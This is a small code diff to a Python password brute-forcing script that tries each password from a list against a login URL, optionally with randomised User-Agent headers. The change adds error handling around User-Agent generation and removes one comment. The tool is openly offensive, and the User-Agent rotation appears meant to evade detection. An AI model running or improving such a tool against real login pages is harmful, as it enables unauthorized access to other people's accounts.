@@ -3,8 +3,12 @@ from fake_useragent import UserAgent
 import argparse
 
 def brute_force_attack(username, password_list, url, success_url, port, random_agent):
-    ua = UserAgent()
-    headers = {'User-Agent': ua.random} if random_agent else {'User-Agent': 'Mozilla/5.0'}
+    try:
+        ua = UserAgent()
+        headers = {'User-Agent': ua.random} if random_agent else {'User-Agent': 'Mozilla/5.0'}
+    except Exception:
+        print("Warning: Failed to generate a random User-Agent. Falling back to default.")
+        headers = {'User-Agent': 'Mozilla/5.0'}
 
     for password in password_list:
         print(f"Attempting with password: {password}")
@@ -27,7 +31,6 @@ def brute_force_attack(username, password_list, url, success_url, port, random_a
             print(f"Error: {e}")
             continue
     else:
-        # If the loop completes without finding the key
         print("KEY NOT FOUND")
 
 def main():
